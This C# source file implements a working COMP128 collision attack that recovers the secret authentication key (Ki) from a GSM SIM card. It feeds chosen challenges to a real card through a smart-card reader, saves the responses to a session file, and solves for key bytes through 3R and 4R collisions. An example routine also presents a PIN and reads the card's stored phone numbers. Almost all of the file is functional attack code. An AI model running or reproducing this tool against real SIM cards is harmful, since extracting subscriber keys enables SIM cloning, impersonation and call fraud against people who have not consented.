using System;
using System.Linq;
using System.Collections.Generic;
using System.Text;
using System.IO;
using GemCard;
using System.Threading;
using System.Diagnostics;

namespace SIMEmu
{
    interface IComp128Impl
    {
        bool A38(byte[] Rand, byte[] Result);
    }


    class Comp128Cracker
    {
        IComp128Impl comp128;
        #region Byte packing routines
        private uint Pack4Bytes(byte a, byte b, byte c, byte d)
        {
            return ((uint)a) | ((uint)b << 8) | ((uint)c << 16) | ((uint)d << 24);
        }
        private void Unpack4Bytes(uint l, ref byte a, ref byte b, ref byte c, ref byte d)
        {
            a = (byte)l;
            b = (byte)(l >> 8);
            c = (byte)(l >> 16);
            d = (byte)(l >> 24);
        }
        private ulong Pack8Bytes(byte[] a)
        {
            ulong r = 0;
            for (int i = 0; i < 8; i++) r = (r << 8) | a[i];
            return r;
        }
        private void Unpack8Bytes(ulong l, byte[] a)
        {
            for (int i = 0; i < 8; i++)
            {
                a[7 - i] = (byte)l;
                l >>= 8;
            }
        }
        #endregion
        private FileStream session;
        private byte[] Rand;
        private int kid;
        private byte[] start_pos;
        private Random rng;
        private Dictionary<ulong, uint> hashes;
        private Comp128Cracker() { }
        public Comp128Cracker(IComp128Impl c) 
        { 
            comp128 = c;
            rng = new Random();

            Rand = new byte[16];
            start_pos = new byte[4];
            kid = 1;
            hashes = new Dictionary<ulong, uint>();
        }
        public bool InitNewSession(string sessionfile)
        {
            try
            {
                session = new FileStream(sessionfile, FileMode.CreateNew);
                rng.NextBytes(Rand);
                for (int i = 0; i < start_pos.Length; i++) start_pos[i] = 0;
                session.Write(Rand, 0, Rand.Length);
                session.WriteByte((byte)kid);
                return true;
            }
            catch (System.Exception)
            {
                return false;
            }
        }
        public bool RestoreSession(string sessionfile)
        {
            session = new FileStream(sessionfile, FileMode.Open);
            session.Seek(0, SeekOrigin.Begin);
            session.Read(Rand, 0, Rand.Length);
            kid = session.ReadByte(); 
            int data_len = (int)(session.Length - session.Position);
            Debug.Assert(data_len % 16 == 0);
            byte[] b = new byte[16];
            //Pick up a random hash and recompute it to verify the integrity of the session file.
            int verify_index = rng.Next(data_len / 16);
            for (int i = 0; i < data_len / 16; i++)
            {
                session.Read(b, 0, 16);
                ulong k = Pack8Bytes(b); //0..11 Result
                uint v = Pack4Bytes(b[12], b[13], b[14], b[15]); //12..15 Rand[kid+(0,4,8,12)]
                hashes[k] = v;
                if (i == verify_index)
                {
                    byte[] r = (byte[])Rand.Clone();
                    byte[] rr = new byte[12];
                    for(int j=0;j<4;j++) r[kid+4*j] = b[12 + j];
                    if (!comp128.A38(r, rr))
                        return false;
                    bool mismatch = false;
                    for (int j = 0; j < rr.Length; j++) if (rr[j] != b[j]) mismatch = true;
                    if (mismatch)
                    {
                        Console.WriteLine("ERR: Session file does NOT match SIM!");
                        return false;
                    }
                    else
                        Console.WriteLine("OK: Session file matches SIM.");
                }
            }
            for (int i = 0; i < 4; i++)
                start_pos[i] = b[12+i];
            IncrementStartPos();
            return true;
        }
        private void IncrementStartPos()
        {
            Unpack4Bytes(Pack4Bytes(start_pos[0], start_pos[2], start_pos[1], start_pos[3]) + 1,
                ref start_pos[0], ref start_pos[2], ref start_pos[1], ref start_pos[3]);
        }
        private volatile bool stopping;
        private Thread worker;
        public void Start()
        {
            stopping = false;
            worker = new Thread(Collect);
            worker.Start();
        }
        public void Stop()
        {
            stopping = true;
            worker.Join();
            session.Close();
        }

        private long Get3RCollisionProbability(long R0, long R1)
        {
            long p = 1;
            for (int i = 0; i < 8; i++)
            {
                int r0 = (int)(R0 & 0x3F); R0 >>= 6;
                int r1 = (int)(R1 & 0x3F); R1 >>= 6;
                if (r0 == r1) //Collision at 3R gives 100% contribution
                {
                    p *= (1 << 6);
                    continue;
                }
                int denom = 0;
                for (int r2 = 0; r2 < (1 << 6); r2++)
                {
                    int t0 = r0, t1 = r1, t0_ = r2, t1_ = r2;
                    Comp128.swap(ref t0, ref t0_, 3);
                    Comp128.swap(ref t1, ref t1_, 3);
                    if ((t0 == t1) && (t0_ == t1_)) denom++;
                }
                if (denom == 0) return 0;
                p *= denom ;
            }
            return p;
        }

        Dictionary<int, int>[] blacklist_rand = new Dictionary<int, int>[65536];
        private bool is_rand_blacklisted(int k0, int k8, int r0, int r8)
        {
            int pk = (k0 << 8) | k8;
            int sk = (r0 << 8) | r8;
            if (blacklist_rand[pk] == null)
            {
                blacklist_rand[pk] = new Dictionary<int, int>();
                var X = Comp128.find_2Rcollision_rands(k0, k8);
                foreach (var x in X)
                {
                    blacklist_rand[pk][x.Key] = 1;
                }
            }
            return blacklist_rand[pk].ContainsKey(sk);
        }

        //Return all pairs of 2R partial collisions, differ only in [offset]
        Dictionary<int, List<uint>>[] cache_2rpc = new Dictionary<int, List<uint>>[4];
        private List<uint> find_2rpc_pair(int k0, int k8, int offset)
        {
            if (cache_2rpc[offset] == null)
                cache_2rpc[offset] = new Dictionary<int, List<uint>>();
            int pk = (k0 << 8) | k8;
            if (cache_2rpc[offset].ContainsKey(pk)) return cache_2rpc[offset][pk];

            List<KeyValuePair<uint, uint>> hashes = new List<KeyValuePair<uint, uint>>();
            uint mask = ~((uint)0x7F << (7*offset));
            for(uint r0=0;r0<256;r0++)
                for (uint r8 = 0; r8 < 256; r8++)
                {
                    hashes.Add(new KeyValuePair<uint, uint>((r0 << 8) | r8, (uint)Comp128.Compute2R(k0, k8, (int)r0, (int)r8) & mask));
                }
            hashes.Sort((x, y) => x.Value.CompareTo(y.Value));

            List<uint> result = new List<uint>();
            var p = hashes.GetEnumerator();
            var prev = p;
            while (p.MoveNext())
            {
                if (p.Current.Value == prev.Current.Value) 
                    if (!is_rand_blacklisted(k0, k8, (int)prev.Current.Key, (int)p.Current.Key))
                        result.Add((prev.Current.Key << 16) | p.Current.Key);
                prev = p;
            }
            cache_2rpc[offset][pk] = result;
            return result;
        }
        private bool Find3RCollisionPair(int k0, int k4, int k8, int k12, ref uint r0, ref uint r1)
        {
            r0 = r1 = 0;
            Dictionary<ulong, uint> seen = new Dictionary<ulong, uint>();
            var L_2RPC = find_2rpc_pair(k0, k8, 0);
            int count = 0;
            Random prng = new Random();
            foreach (var l_2prc in L_2RPC)
                for (int r_int = 0; r_int <= 0x7F; r_int++ )
                {
                    byte r0_0 = (byte)(l_2prc >> 24);
                    byte r0_8 = (byte)(l_2prc >> 16);
                    byte r1_0 = (byte)(l_2prc >> 8);
                    byte r1_8 = (byte)(l_2prc >> 0);
                    byte r0_4, r1_4;
                    r0_4 = r1_4 = (byte)prng.Next();//(r_int >> 0);
                    byte r0_12, r1_12;
                    r0_12 = r1_12 = (byte)prng.Next(); // (r_int >> 8);
                    count++;
                    if (is_rand_blacklisted(k4, k12, r0_4, r0_12)) continue;
                    if (Comp128.Compute3R(k0, k4, k8, k12, r0_0, r0_4, r0_8, r0_12) ==
                        Comp128.Compute3R(k0, k4, k8, k12, r1_0, r1_4, r1_8, r1_12))
                    {
                        r0 = Pack4Bytes(r0_0, r0_4, r0_8, r0_12);
                        r1 = Pack4Bytes(r1_0, r1_4, r1_8, r1_12);
                        return true;
                    }
                }
            return false;
            //r0 = r1 = 0;
            //Dictionary<ulong, uint> seen = new Dictionary<ulong, uint>();
            //Random prng = new Random();
            //byte[] r = new byte[4];
            //uint r_int = 0;
            //while(true){
            //    r[3] = (byte)(r_int >> 0);
            //    r[2] = (byte)(r_int >> 8);
            //    r[1] = (byte)(r_int >> 16);
            //    r[0] = (byte)(r_int >> 24);
            //    if (is_rand_blacklisted(k0, k8, r[0], r[2]) || is_rand_blacklisted(k4, k12, r[1], r[3])) { r_int++; continue; }
            //    ulong h = (ulong)Comp128.Compute3R(k0, k4, k8, k12, r[0], r[1], r[2], r[3]);
            //    if (seen.ContainsKey(h) && seen[h] != r_int)
            //    {
            //        r0 = Pack4Bytes((byte)(seen[h] >> 24), (byte)(seen[h] >> 16), (byte)(seen[h] >> 8), (byte)(seen[h] >> 0));
            //        r1 = Pack4Bytes((byte)(r_int >> 24), (byte)(r_int >> 16), (byte)(r_int >> 8), (byte)(r_int >> 0));
            //        return true;
            //    }
            //    else
            //        seen[h] = r_int;
            //    r_int++;
            //}
        }
        public void Solve3RCollision(uint R0, uint R1)
        {
            Console.WriteLine("Searching key pair using 3R collision.");
            Comp128 c = new Comp128();
            byte r0_0 = 0, r4_0 = 0, r8_0 = 0, r12_0 = 0, r0_1 = 0, r4_1 = 0, r8_1 = 0, r12_1 = 0;
            Unpack4Bytes(R0, ref r0_0, ref r4_0, ref r8_0, ref r12_0);
            Unpack4Bytes(R1, ref r0_1, ref r4_1, ref r8_1, ref r12_1);

            //Sort all possible K0 K8 pair in ascending order of their 2R's hamming distance and try in that order.
            List<KeyValuePair<int, int>> K08 = new List<KeyValuePair<int, int>>();
            for (int k0 = 0; k0 <= 0xFF; k0++)
                for (int k8 = 0; k8 <= 0xFF; k8++)
                    K08.Add(new KeyValuePair<int, int>((k0 << 8) | k8, Comp128.Compute2R(k0, k8, r0_0, r8_0) ^ Comp128.Compute2R(k0, k8, r0_1, r8_1)));
            K08.Sort(new IntComparer<KeyValuePair<int, int>>(v => HammingDistance.long_hamming(v.Value)));

            foreach (var k08 in K08)
            {
                int k0 = (k08.Key >> 8) & 0xFF;
                int k8 = (k08.Key >> 0) & 0xFF;
                //SOrt K4 K12 in ascending order of 3R
                List<KeyValuePair<int, long>> K412 = new List<KeyValuePair<int, long>>();
                for (int k4 = 0; k4 <= 0xFF; k4++)
                    for (int k12 = 0; k12 <= 0xFF; k12++)
                        K412.Add(new KeyValuePair<int, long>((k4 << 8) | k12,
                            Comp128.Compute3R(k0, k4, k8, k12, r0_0, r4_0, r8_0, r12_0) ^
                            Comp128.Compute3R(k0, k4, k8, k12, r0_1, r4_1, r8_1, r12_1)
                            ));
                K412.Sort(new IntComparer<KeyValuePair<int, long>>(v => HammingDistance.long_hamming(v.Value)));

                //Find probability of 3R/4R collisions of every quadruple Ri
                List<KeyValuePair<int, long>> K412P = new List<KeyValuePair<int, long>>();
                foreach (var k412 in K412)
                {
                    int k4 = (k412.Key >> 8) & 0xFF;
                    int k12 = (k412.Key >> 0) & 0xFF;
                    long ThreeR0 = Comp128.Compute3R(k0, k4, k8, k12, r0_0, r4_0, r8_0, r12_0);
                    long ThreeR1 = Comp128.Compute3R(k0, k4, k8, k12, r0_1, r4_1, r8_1, r12_1);
                    long diff = ThreeR0 ^ ThreeR1;
                    if (HammingDistance.long_hamming(diff) > 6) break;
                    if (HammingDistance.long_hamming(diff) > 3) continue;
                    long p = Get3RCollisionProbability(ThreeR0, ThreeR1);
                    if (p == 0) continue;
                    K412P.Add(new KeyValuePair<int, long>((k4 << 8) | k12, p));
                }
                if (K412P.Count > 0)
                    Console.WriteLine(String.Format("Found {0} candidate keys.", K412P.Count));
                //Output quadruple Ri in descending probabilities of 3R/4R collision
                K412P.Sort((x, y) => x.Value.CompareTo(y.Value));
                List<KeyValuePair<int, long>> K412R;
                do
                {
                    byte[] test_r = new byte[16];
                    (new Random()).NextBytes(test_r);
                    byte[] test_rst0 = new byte[12];
                    byte[] test_rst1 = new byte[12];
                    int refined_keys = 0;
                    K412R = new List<KeyValuePair<int, long>>();
                    foreach (var k412p in K412P)
                    {
                        int k4 = (k412p.Key >> 8) & 0xFF;
                        int k12 = (k412p.Key >> 0) & 0xFF;
                        uint test_r0 = 0, test_r1 = 0;
                        //Obtain another 3R collision pair for a particular key and test in on real algo.
                        bool trc = Find3RCollisionPair(k0, k4, k8, k12, ref test_r0, ref test_r1);
                        Debug.Assert(trc);
                        Unpack4Bytes(test_r0, ref test_r[kid], ref test_r[kid + 4], ref test_r[kid + 8], ref test_r[kid + 12]);
                        comp128.A38(test_r, test_rst0);
                        Unpack4Bytes(test_r1, ref test_r[kid], ref test_r[kid + 4], ref test_r[kid + 8], ref test_r[kid + 12]);
                        comp128.A38(test_r, test_rst1);
                        bool false_positive = (Pack8Bytes(test_rst0) != Pack8Bytes(test_rst1));
                        Console.WriteLine(String.Format("{5} Key: {0:x2} {1:x2} {2:x2} {3:x2} with p = {4:F2}%",
                            new object[] { k0, k4, k8, k12, k412p.Value * 100.0 / ((long)1 << 48), false_positive ? "False" : "Possible" }));
                        if (!false_positive)
                        {
                            refined_keys++;
                            K412R.Add(new KeyValuePair<int, long>(k4 << 8 | k12, k412p.Value));
                        }
                    }
                    foreach (var k412r in K412R)
                        Console.WriteLine(String.Format("Refined Key: {0:x2} {1:x2} {2:x2} {3:x2}",
                            new object[] { k0, (k412r.Key >> 8) & 0xFF, k8, (k412r.Key >> 0) & 0xFF }));
                    K412P = K412R;
                }while (K412R.Count > 1);
                if (K412R.Count == 1)
                {
                    int k412r = K412R.Find(x => true).Key;
                    if (Attack4R(k0, k412r >> 8, k8, k412r & 0xFF)) return;
                }
            }
        }

        private List<ulong> find_3rpc_pair(int k0, int k4, int k8, int k12, int offset)
        {
            //int pk = (k0 << 8) | k8;
            //if (cache_2rpc.ContainsKey(pk)) return cache_2rpc[pk];
            uint[] r0 = new uint[4]; //r0, r4, r8, r12
            uint[] r1 = new uint[4];
            long mask = ~((long)0x3F << (6*offset));
            List<ulong> result = new List<ulong>();
            foreach (var r08 in find_2rpc_pair(k0, k8, offset / 2))
                foreach (var r412 in find_2rpc_pair(k4, k12, offset / 2))
                {
                    uint r0_8 = r08 & 0xFF;
                    uint r0_0 = (r08 >> 8) & 0xFF;
                    uint r1_8 = (r08 >> 16) & 0xFF;
                    uint r1_0 = (r08 >> 24) & 0xFF;
                    uint r0_12 = r412 & 0xFF;
                    uint r0_4 = (r412 >> 8) & 0xFF;
                    uint r1_12 = (r412 >> 16) & 0xFF;
                    uint r1_4 = (r412 >> 24) & 0xFF;
                    long x = Comp128.Compute3R(k0, k4, k8, k12, (int)r0_0, (int)r0_4, (int)r0_8, (int)r0_12);
                    long y = Comp128.Compute3R(k0, k4, k8, k12, (int)r1_0, (int)r1_4, (int)r1_8, (int)r1_12);
                    if (((x^y) & mask) == 0)
                    {
                        result.Add(((ulong)Pack4Bytes((byte)r0_0, (byte)r0_4, (byte)r0_8, (byte)r0_12)) |
                            (((ulong)Pack4Bytes((byte)r1_0, (byte)r1_4, (byte)r1_8, (byte)r1_12)) << 32)
                        );
                    }
                }
            return result;
        }

        //4R collision is defined Useful if there exists only one Y such that swap(x0, Y) == swap(x1, Y)
        private int is_usable_4RCollision(int x0, int x1)
        {
            int r = -1;
            for (int y = 0; y < (1 << 6); y++)
            {
                int x0_ = x0, x1_ = x1, y0 = y, y1 = y;
                Comp128.swap(ref x0_, ref y0, 3);
                Comp128.swap(ref x1_, ref y1, 3);
                if (x0_ == x1_ && y0 == y1)
                    if (r != -1)
                        return -1;
                    else
                        r = y;
            }
            return r;
        }

        //Return all possible ki quadruples whose 3R computation gives b at offset
        //The trick is to undo 1 level 3 swap operation, the required result is just a cartesian product of 
        //matching (K0,K8) and (K4, K12). Complexity reduced from 2^32 to 2^26
        byte[,] get_candidates_from_3r_byte(int r0, int r4, int r8, int r12, int b, int offset)
        {
            List<int> r = new List<int>();
            var R08 = Enumerable.Range(0, 65536).Select(x => new KeyValuePair<int, int>(x, Comp128.Compute2R((x >> 8) &0xFF, x&0xFF, r0, r8))).ToList();
            var R412 = Enumerable.Range(0, 65536).Select(x => new KeyValuePair<int, int>(x, Comp128.Compute2R((x >> 8) &0xFF, x&0xFF, r4, r12))).ToList();
            List<KeyValuePair<int, int>>[] filtered_R08 = new List<KeyValuePair<int, int>>[1 << 7];
            List<KeyValuePair<int, int>>[] filtered_R412 = new List<KeyValuePair<int, int>>[1 << 7];
            int shift_bits = (7 * (offset / 2));
            for (int i = 0; i < (1 << 7); i++)
            {
                filtered_R08[i] = R08.Where(x => i == ((x.Value >> shift_bits) & 0x7F)).ToList();
                filtered_R412[i] = R412.Where(x => i == ((x.Value >> shift_bits) & 0x7F)).ToList();
            }

            for (int a0 = 0; a0 < (1 << 7); a0++) //undo swap such that swap(a0,a1) => swap(b0, b1)
                for (int a1 = 0; a1 < (1 << 7); a1++)
                {
                    int ta0 = a0, ta1 = a1;
                    Comp128.swap(ref ta0, ref ta1, 2);
                    if (   ((offset % 2 == 1) && (ta0 != b))  //a0 matches b if offset is odd
                        || ((offset % 2 == 0) && (ta1 != b))  ) continue;
                    //Now need to produce the cartesian product of K08 whose value at offset is a0, and K412 whose value at offset is a1
                    foreach (var k08 in filtered_R08[a0])
                        foreach (var k412 in filtered_R412[a1])
                            r.Add((k08.Key << 16) | k412.Key);
                }

            byte[,] result = new byte[r.Count, 4];
            int c = 0;
            foreach (var x in r)
            {
                result[c, 0] = (byte)(x >> 24);
                result[c, 1] = (byte)(x >> 8);
                result[c, 2] = (byte)(x >> 16);
                result[c, 3] = (byte)(x >> 0);
                //var xx = Comp128.Compute3R(result[c, 0], result[c, 1], result[c, 2], result[c, 3], r0, r4, r8, r12);
                //var y = ((int)(xx >> (6 * offset)) & 0x3F);
                c++;
            }
            return result;
            //long x;
            //for (int k2 = 0; k2 <= 0xFF; k2++)
            //    for (int k6 = 0; k6 <= 0xFF; k6++)
            //    {
            //        Console.Write(String.Format("\r {0}/65536", k2 * 256 + k6));
            //        for (int k10 = 0; k10 <= 0xFF; k10++)
            //            for (int k14 = 0; k14 <= 0xFF; k14++)
            //            {
            //                x = Comp128.Compute3R(k2, k6, k10, k14, r2, r6, r10, r14);
            //                if (((int)(x >> (6 * offset)) & 0x3F) == intermediate_r)
            //                    candidates.Add(new byte[] { (byte)k2, (byte)k6, (byte)k10, (byte)k14 });
            //            }
            //    }

        }
        //By constructing appropriate 3R partial collisions, induce 4R collision probabilistically. 
        //If 4R collision is detected, one byte (6bits) of the state of the cipher after 3R can be determined.
        //By repeatedly obtaining these bytes, enough information is gathered to break k_(4i+2)
        public bool Attack4R(int k0, int k4, int k8, int k12)
        {
            Console.WriteLine("4R Attack..");
            byte[] test_r = new byte[16];
            byte[] test_rst0 = new byte[12];
            byte[] test_rst1 = new byte[12];
            byte[] r0 = new byte[4];
            byte[] r1 = new byte[4];
            byte[,] candidates = null;  //This can be huge (2^26). Need plain array to save memory.
            Random prng = new Random();
            int a38_count = 0;
            for (int offset = 0; offset < 8; offset++)
            {
                Console.Write(String.Format("Trying 3RPC at offset {0}: ", offset));
                foreach (var rpc in find_3rpc_pair(k0, k4, k8, k12, offset))
                {
                    Unpack4Bytes((uint)rpc, ref r0[0], ref r0[1], ref r0[2], ref r0[3]);
                    Unpack4Bytes((uint)(rpc >> 32), ref r1[0], ref r1[1], ref r1[2], ref r1[3]);
                    long rr0 = Comp128.Compute3R(k0, k4, k8, k12, r0[0], r0[1], r0[2], r0[3]);
                    long rr1 = Comp128.Compute3R(k0, k4, k8, k12, r1[0], r1[1], r1[2], r1[3]);
                    int intermediate_r = is_usable_4RCollision((int)(rr0 >> (6 * offset)) & 0x3F, (int)(rr1 >> (6 * offset)) & 0x3F);
                    if (intermediate_r < 0) continue;
                    Console.Write(".");
                    for (int c = 0; c < (1 << 10); c++) //Try to obtain 4R collision probabilistically with p = 1/(1<<6)
                    {
                        prng.NextBytes(test_r);
                        Unpack4Bytes((uint)rpc, ref test_r[kid], ref test_r[kid + 4], ref test_r[kid + 8], ref test_r[kid + 12]);
                        comp128.A38(test_r, test_rst0);
                        Unpack4Bytes((uint)(rpc >> 32), ref test_r[kid], ref test_r[kid + 4], ref test_r[kid + 8], ref test_r[kid + 12]);
                        comp128.A38(test_r, test_rst1);
                        a38_count += 2;
                        bool collide = (Pack8Bytes(test_rst0) == Pack8Bytes(test_rst1));
                        if (collide) //Obtain 6 bits of information, time to bruteforce.
                        {
                            Console.WriteLine(String.Format("Found 4R collision after {0} A38 invocations.", a38_count));
                            a38_count = 0;
                            byte r2 = test_r[kid + 2], r6 = test_r[kid + 6], r10 = test_r[kid + 10], r14 = test_r[kid + 14];
                            //long x = Comp128.Compute3R(0xAA, 0x9F, 0x05, 0x28, test_r[kid + 2], test_r[kid + 6], test_r[kid + 10], test_r[kid + 14]);
                            //int y = (int)(x >> (6 * offset)) & 0x3F;
                            if (candidates == null) //First time is slow
                            {
                                candidates = get_candidates_from_3r_byte(r2, r6, r10, r14, intermediate_r, offset);
                                Console.WriteLine(String.Format("Obtained {0} candidates.", candidates.GetLength(0)));
                                break;
                            }
                            else //Refine Candidates.
                            {
                                Console.Write("Refining..");
                                List<byte[]> c2 = new List<byte[]>();
                                for (int i = 0; i < candidates.GetLength(0); i++)
                                {
                                    long x = Comp128.Compute3R(candidates[i, 0], candidates[i, 1], candidates[i, 2], candidates[i, 3], r2, r6, r10, r14);
                                    if (((int)(x >> (6 * offset)) & 0x3F) == intermediate_r)
                                        c2.Add(new byte[] { candidates[i, 0], candidates[i, 1], candidates[i, 2], candidates[i, 3] });
                                }
                                candidates = new byte[c2.Count, 4];
                                int j = 0;
                                foreach (var x in c2)
                                {
                                    candidates[j, 0] = x[0]; candidates[j, 1] = x[1]; candidates[j, 2] = x[2]; candidates[j, 3] = x[3];
                                    j++;
                                }
                                Console.WriteLine(String.Format("Refined to {0} candidates.", candidates.GetLength(0)));
                                if (candidates.GetLength(0) == 1)
                                {
                                    Console.WriteLine(String.Format("4R Key: {4:X2} {0:X2} {5:X2} {1:X2} {6:X2} {2:X2} {7:X2} {3:X2}",
                                        new object[] { candidates[0, 0], candidates[0, 1], candidates[0, 2], candidates[0, 3], k0, k4, k8, k12 }));
                                    return true;
                                }
                                else if (candidates.GetLength(0) == 0)
                                {
                                    Console.WriteLine("4R Attack failed!");
                                    return false;
                                }
                            }
                        }
                    }
                }
            }
            return true;
        }
        public void Collect()
        {
            long t0, t;
            t0 = t = System.Environment.TickCount;
            int c0 = hashes.Count;

            byte[] r = new byte[12];
            Console.WriteLine();
            while (!stopping)
            {
                if (System.Environment.TickCount - t > 250)
                {
                    t = System.Environment.TickCount;
                    Console.Write(String.Format("\rObtained {0:d8} hashes. Speed: {1:F2} op/sec", 
                        hashes.Count, (hashes.Count - c0)/((t - t0) / 1000.0))
                        );
                }
                for (int i = 0; i < 4;i++)
                    Rand[kid + 4 * i] = start_pos[i];

                if (!comp128.A38(Rand, r)) break;
                
                ulong k = Pack8Bytes(r);
                uint v = Pack4Bytes(start_pos[0], start_pos[1], start_pos[2], start_pos[3]);
                if (!hashes.ContainsKey(k))
                    hashes[k] = v;
                else
                {
                    Console.WriteLine();
                    Console.WriteLine(String.Format("Collision detected after {0} steps.", hashes.Count));
                    Solve3RCollision(hashes[k], Pack4Bytes(start_pos[0], start_pos[1], start_pos[2], start_pos[3]));
                    break;
                }
                session.Write(r, 0, r.Length);
                for (int i = 0; i < 4; i++) session.WriteByte(start_pos[i]);
                session.Flush();

                IncrementStartPos();
            }
        }
    }


    class SIMInterface : IComp128Impl
    {
        private APDUCommand
            apduVerifyCHV = new APDUCommand(0xA0, 0x20, 0, 1, null, 0),
            apduRunGSM = new APDUCommand(0xA0, 0x88, 0, 0, null, 0),
            apduSelectFile = new APDUCommand(0xA0, 0xA4, 0, 0, null, 0),
            apduReadRecord = new APDUCommand(0xA0, 0xB2, 1, 4, null, 0),
            apduGetResponse = new APDUCommand(0xA0, 0xC0, 0, 0, null, 0);

        const ushort SC_OK = 0x9000;
        const byte SC_PENDING = 0x9F;

        private CardNative iCard;
        private bool DFgsm_selected; 
        public SIMInterface()
        {
            iCard = new CardNative();

            string[] readers = iCard.ListReaders();
            Console.WriteLine("Please insert card into the reader and press any key...");
            Console.ReadKey(true);

            iCard.Connect(readers[0], SHARE.Shared, PROTOCOL.T0orT1);
            Console.WriteLine("Connects card on reader: " + readers[0]);
            DFgsm_selected = false;
        }

        public void Disconnect()
        {
            try
            {
                iCard.Disconnect(DISCONNECT.Unpower);
            }
            catch (Exception){}
        }

        ~SIMInterface() { Disconnect(); }

        #region Example Code
        /// <summary>
        /// This program tests the API with a SIM card. 
        /// If your PIN is activated be careful when presenting the PIN to your card! 
        /// </summary>
        public void Test()
        {
            try
            {
                DFgsm_selected = false;
                APDUResponse apduResp;
                APDUParam apduParam = new APDUParam();

                // Verify the PIN (if necessary)
                byte[] pin = new byte[] { 0x31, 0x32, 0x33, 0x34, 0xFF, 0xFF, 0xFF, 0xFF };
                apduParam.Data = pin;
                apduVerifyCHV.Update(apduParam);
                apduResp = iCard.Transmit(apduVerifyCHV);
                // Select the MF (3F00)
                apduParam.Data = new byte[] { 0x3F, 0x00 };
                apduSelectFile.Update(apduParam);
                apduResp = iCard.Transmit(apduSelectFile);
                if (apduResp.Status != SC_OK && apduResp.SW1 != SC_PENDING)
                    throw new Exception("Select command failed: " + apduResp.ToString());
                Console.WriteLine("MF selected");

                // Select the EFtelecom (7F10)
                apduParam.Data = new byte[] { 0x7F, 0x10 };
                apduSelectFile.Update(apduParam);
                apduResp = iCard.Transmit(apduSelectFile);
                if (apduResp.Status != SC_OK && apduResp.SW1 != SC_PENDING)
                    throw new Exception("Select command failed: " + apduResp.ToString());
                Console.WriteLine("DFtelecom selected");

                // Select the EFadn (6F3A)
                apduParam.Data = new byte[] { 0x6F, 0x3A };
                apduSelectFile.Update(apduParam);
                apduResp = iCard.Transmit(apduSelectFile);
                if (apduResp.Status != SC_OK && apduResp.SW1 != SC_PENDING)
                    throw new Exception("Select command failed: " + apduResp.ToString());
                Console.WriteLine("EFadn (Phone numbers) selected");

                // Read the response
                if (apduResp.SW1 == SC_PENDING)
                {
                    apduParam.Reset();
                    apduParam.Le = apduResp.SW2;
                    apduParam.Data = null;
                    apduGetResponse.Update(apduParam);
                    apduResp = iCard.Transmit(apduGetResponse);
                    if (apduResp.Status != SC_OK)
                        throw new Exception("Select command failed: " + apduResp.ToString());
                }

                // Get the length of the record
                int recordLength = apduResp.Data[14];

                Console.WriteLine("Reading the Phone number 10 first entries");
                // Read the 10 first record of the file
                for (int nI = 0; nI < 10; nI++)
                {
                    apduParam.Reset();
                    apduParam.Le = (byte) recordLength;
                    apduParam.P1 = (byte) (nI + 1);
                    apduReadRecord.Update(apduParam);
                    apduResp = iCard.Transmit(apduReadRecord);

                    if (apduResp.Status != SC_OK)
                        throw new Exception("ReadRecord command failed: " + apduResp.ToString());

                    Console.WriteLine("Record #" + ((int) (nI + 1)).ToString());
                    Console.WriteLine(apduResp.ToString());
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
                #endregion

        #region IComp128Impl Members

        public void SelectDFGsm()
        {
            APDUResponse apduResp;
            APDUParam apduParam = new APDUParam();

            // Select the DF_GSM (7F20)
            apduParam.Data = new byte[] { 0x7F, 0x20 };
            apduSelectFile.Update(apduParam);
            apduResp = iCard.Transmit(apduSelectFile);
            if (apduResp.Status != SC_OK && apduResp.SW1 != SC_PENDING)
                throw new Exception("Select command failed: " + apduResp.ToString());
            Console.WriteLine("DFgsm selected");
            DFgsm_selected = true;
        }
        public bool A38(byte[] Rand, byte[] Result)
        {
            Debug.Assert(Rand.Length == 16);
            try
            {
                if (!DFgsm_selected) SelectDFGsm();

                APDUResponse apduResp;
                APDUParam apduParam = new APDUParam();

                //Execute A38 Algorithm
                apduParam.Data = (byte[])Rand.Clone();
                apduRunGSM.Update(apduParam);
                apduResp = iCard.Transmit(apduRunGSM);
                if (apduResp.SW1 != SC_PENDING)
                    throw new Exception("RunGSM: " + apduResp.ToString());

                apduParam.Reset();
                apduParam.Le = apduResp.SW2;
                apduParam.Data = null;
                apduGetResponse.Update(apduParam);
                apduResp = iCard.Transmit(apduGetResponse);
                if (apduResp.Status != SC_OK)
                    throw new Exception("Get GSM result failed: " + apduResp.ToString());
                //Console.Write("GSM Result: ");
                //for (int i = 0; i < apduResp.Data.Length; i++)
                //    Console.Write(String.Format("{0:X2}", apduResp.Data[i]));
                //Console.WriteLine();
                apduResp.Data.CopyTo(Result, 0);
                return true;
                }
            catch (System.Exception ex)
            {
                Console.WriteLine("SIM Run_GSM exception: " + ex.ToString());
                return false;
            }
        }

        #endregion
    }
}
